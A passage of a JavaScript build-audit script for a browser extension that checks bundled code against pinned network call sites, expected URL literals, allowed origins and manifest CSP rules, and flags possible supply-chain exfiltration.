      console.log(`   ${f.file}  ${sig}`);
      if (f.kind === "call" || f.kind === "dynamic-import") {
        console.log(
          `   │ destination: ${JSON.stringify(f.resolved)} origin: ${JSON.stringify(f.resolvedOrigin)}`,
        );
        if (f.init) console.log(`   │ init keys: ${f.init.keys.join(", ")}`);
      }
      console.log(`   │ ${f.snippet.replace(/\s+/g, " ").slice(0, 140)}`);
    }
    console.log(`   counts: ${JSON.stringify(counts)}`);
    console.log(
      `   urls: ${JSON.stringify([...urlLiterals[ctx].keys()], null, 2)}`,
    );
  }
  console.log(`\n── files ──`);
  console.log(`   scripts: ${JSON.stringify(scripts)}`);
  console.log(`   css:     ${JSON.stringify(css)}`);
  console.log(`   inert:   ${JSON.stringify(inert)}`);
  process.exit(0);
}

const censusErrors = [];
const unexpected = [];

function pinFailure(f, pins) {
  const sameKind = pins.filter((p) => p.kind === f.kind && p.name === f.name);
  if (sameKind.length === 0) return "no pin for this kind of call";
  const reasons = [];
  for (const p of sameKind) {
    if (p.snippet && !f.snippet.includes(p.snippet)) {
      reasons.push(`does not match pinned site ${JSON.stringify(p.snippet)}`);
      continue;
    }
    if (p.destinationOrigin === null && f.resolvedOrigin !== null) {
      reasons.push(
        `destination resolves to the REMOTE origin ${f.resolvedOrigin}; this context may only reach extension-local URLs`,
      );
      continue;
    }
    if (typeof p.destinationOrigin === "string") {
      if (f.resolvedOrigin === null) {
        reasons.push(
          `destination could not be resolved statically (got ${JSON.stringify(f.resolved)}); the pin requires it to resolve to ${p.destinationOrigin}. Either the destination is no longer built from a literal in this file, or the bundle shape moved past what the resolver follows -- re-derive the pin, do not relax it`,
        );
        continue;
      }
      if (f.resolvedOrigin !== p.destinationOrigin) {
        reasons.push(
          `destination resolves to ${f.resolvedOrigin}, pinned to ${p.destinationOrigin}`,
        );
        continue;
      }
    }
    if (p.init) {
      if (!f.init) {
        reasons.push("fetch init is not a plain object literal");
        continue;
      }
      const allowed = new Set([
        ...Object.keys(p.init),
        ...(p.initOptionalKeys ?? []),
      ]);
      const extra = f.init.keys.filter((k) => !allowed.has(k));
      const wrong = Object.entries(p.init).filter(
        ([k, v]) => f.init.values[k] !== v,
      );
      if (extra.length > 0)
        reasons.push(`fetch init has unpinned option(s) ${extra.join(", ")}`);
      if (wrong.length > 0)
        reasons.push(
          `fetch init must set ${wrong.map(([k, v]) => `${k}:${JSON.stringify(v)}`).join(", ")} (got ${wrong.map(([k]) => `${k}:${JSON.stringify(f.init.values[k])}`).join(", ")})`,
        );
      if (extra.length > 0 || wrong.length > 0) continue;
    }
    reasons.push("matched");
  }
  return reasons.join("; ");
}

function matchesPin(f, p) {
  if (p.kind !== f.kind || p.name !== f.name) return false;
  if (p.snippet && !f.snippet.includes(p.snippet)) return false;
  if (p.destinationOrigin === null && f.resolvedOrigin !== null) return false;
  if (typeof p.destinationOrigin === "string") {
    if (f.resolvedOrigin !== p.destinationOrigin) return false;
  }
  if (p.init) {
    if (!f.init) return false;
    const allowed = new Set([
      ...Object.keys(p.init),
      ...(p.initOptionalKeys ?? []),
    ]);
    if (f.init.keys.some((k) => !allowed.has(k))) return false;
    if (Object.entries(p.init).some(([k, v]) => f.init.values[k] !== v))
      return false;
  }
  return true;
}

for (const ctx of ["worker", "page"]) {
  const expected = EXPECTED_CENSUS[ctx];
  const observed = {};
  for (const f of allFindings.filter((f) => f.context === ctx)) {
    const sig = `${f.kind}:${f.name}`;
    observed[sig] = (observed[sig] ?? 0) + 1;
  }

  for (const sig of new Set([
    ...Object.keys(expected),
    ...Object.keys(observed),
  ])) {
    const want = expected[sig] ?? 0;
    const got = observed[sig] ?? 0;
    if (want !== got) {
      censusErrors.push(
        `[${ctx}] expected exactly ${want} × ${sig}, found ${got}`,
      );
    }
  }

  const pins = PINNED_CALL_SITES[ctx] ?? [];
  const pinHits = pins.map(() => 0);
  for (const f of allFindings.filter(
    (f) =>
      f.context === ctx && (f.kind === "call" || f.kind === "dynamic-import"),
  )) {
    const index = pins.findIndex((p) => matchesPin(f, p));
    if (index < 0) {
      unexpected.push({ ...f, why: pinFailure(f, pins) });
    } else {
      pinHits[index] += 1;
    }
  }
  // An unmatched pin is a guard that silently disappeared.
  pins.forEach((p, i) => {
    if (pinHits[i] !== 1) {
      censusErrors.push(
        `[${ctx}] pinned call site "${p.reason}" matched ${pinHits[i]} call(s), expected exactly 1`,
      );
    }
  });

  // Non-call/import/ref findings are unexpected by construction.
  for (const f of allFindings.filter(
    (f) =>
      f.context === ctx &&
      f.kind !== "call" &&
      f.kind !== "dynamic-import" &&
      f.kind !== "ref",
  )) {
    unexpected.push(f);
  }
}

const urlErrors = [];
for (const ctx of ["worker", "page"]) {
  const expected = new Set(EXPECTED_URL_LITERALS[ctx]);
  const observed = urlLiterals[ctx];

  for (const [url, files] of observed) {
    if (!expected.has(url)) {
      urlErrors.push(
        `[${ctx}] UNEXPECTED absolute URL literal ${JSON.stringify(url)} in ${files.join(", ")}`,
      );
    }
  }
  for (const url of expected) {
    if (!observed.has(url)) {
      urlErrors.push(
        `[${ctx}] expected absolute URL literal ${JSON.stringify(url)} is gone -- if that was deliberate, remove it from EXPECTED_URL_LITERALS in the same commit`,
      );
    }
  }
}

// Worker remote origin literals must equal the allowed set exactly.
const workerRemoteLiterals = [...urlLiterals.worker.keys()]
  .filter((u) => originOf(u) !== null && !MENU_MATCH_PATTERNS.includes(u))
  .sort();
const expectedRemoteLiterals = [...WORKER_ORIGINS].sort();
if (
  workerRemoteLiterals.length !== expectedRemoteLiterals.length ||
  workerRemoteLiterals.some((u, i) => u !== expectedRemoteLiterals[i])
) {
  urlErrors.push(
    `[worker] expected exactly these remote origin literals (${expectedRemoteLiterals.join(", ")}), found ${JSON.stringify(workerRemoteLiterals)}`,
  );
}

// Exactly one built file may name each origin: the worker.
for (const origin of WORKER_ORIGINS) {
  const files = originFiles[origin];
  if (
    files.length !== 1 ||
    files[0] !== workerFile ||
    contextOf(files[0]) !== "worker"
  ) {
    urlErrors.push(
      `${origin} must appear in exactly one built file (${workerFile}); found in ${JSON.stringify(files)}`,
    );
  }
}

const cspErrors = [
  ...validateManifest(OUTPUT_DIR, manifest),
  ...validatePanelHtml(OUTPUT_DIR),
];

console.log("");

if (unexpected.length > 0) {
  console.log("❌ UNEXPECTED NETWORK PRIMITIVES DETECTED");
  console.log(
    "   These matched no pinned call site and may indicate a supply-chain attack.\n",
  );
  for (const f of unexpected) {
    console.log(
      `   [${f.context}] ${f.file}:${f.start}  [${f.kind}] ${f.detail}`,
    );
    if (f.why) console.log(`   │ ${f.why}`);
    const trimmed = f.snippet.replace(/\s+/g, " ").slice(0, 120);
    console.log(`   │ ${trimmed}…`);
    console.log("");
  }
}

if (censusErrors.length > 0) {
  console.log("❌ PER-CONTEXT CENSUS MISMATCH");
  console.log(
    "   Counts are exact on purpose: a removed guard fails as loudly as an added leak.\n",
  );
  for (const err of censusErrors) console.log(`   • ${err}`);
  console.log("");
}

if (urlErrors.length > 0) {
  console.log("❌ ABSOLUTE URL LITERAL MISMATCH");
  console.log(
    "   A change detector, not a proof -- a URL can still be assembled at runtime.\n",
  );
  for (const err of urlErrors) console.log(`   • ${err}`);
  console.log("");
}

if (structureErrors.length > 0) {
  console.log("❌ BUILD STRUCTURE CHANGED");
  console.log("   The audit's assumptions about the bundle no longer hold.\n");
  for (const err of structureErrors) console.log(`   • ${err}`);
  console.log("");
}

if (cspErrors.length > 0) {
  console.log("❌ MANIFEST / PANEL POLICY VALIDATION FAILED");
  console.log(
    "   The built manifest.json or sidepanel.html has been weakened.\n",
  );
  for (const err of cspErrors) console.log(`   • ${err}`);
  console.log("");
}

const workerFindings = allFindings.filter((f) => f.context === "worker").length;
const pageFindings = allFindings.filter((f) => f.context === "page").length;

console.log("── Summary ──────────────────────────────────");
console.log(`   Script files scanned:  ${scripts.length}`);
console.log(`   CSS files scanned:     ${css.length}`);
console.log(`   Inert files skipped:   ${inert.length}`);
console.log(`   worker findings:       ${workerFindings}`);
console.log(`   page findings:         ${pageFindings}`);
console.log(`   worker URL sites:      ${urlLiterals.worker.size}`);
console.log(`   page URL sites:        ${urlLiterals.page.size}`);
console.log(`   Unexpected:            ${unexpected.length}`);
console.log(`   Census errors:         ${censusErrors.length}`);
console.log(`   URL errors:            ${urlErrors.length}`);
console.log(`   Structure errors:      ${structureErrors.length}`);
console.log(`   CSP errors:            ${cspErrors.length}`);
console.log("");

const failed =
  unexpected.length +
  censusErrors.length +
  urlErrors.length +
  structureErrors.length +
  cspErrors.length;

if (failed > 0) {
  console.log("⚠️  Re-run with --census to see the observed census.");
  console.log(
    "   If the change is legitimate, update EXPECTED_CENSUS / PINNED_CALL_SITES /",
  );
  console.log(
    "   EXPECTED_URL_LITERALS in scripts/audit-network.mjs in the SAME commit,",
  );
  console.log(
    "   and say why in the message. If it is not, a dependency may be",
  );
  console.log(
    "   exfiltrating data, or a build plugin may have weakened the CSP.",
  );
  process.exit(1);
}

console.log(
  `✅ worker: ${WORKER_ORIGINS.length} fetch call sites, one per pinned destination (${WORKER_ORIGINS.join(", ")}); no other remote origin nameable.`,
);
console.log(
  "✅ page:   no code that can name a remote destination; 2 wasm loaders only.",
);
console.log(
  "✅ manifest: connect-src exact, permissions pinned, no host/sandbox keys, panel meta CSP present.",
);
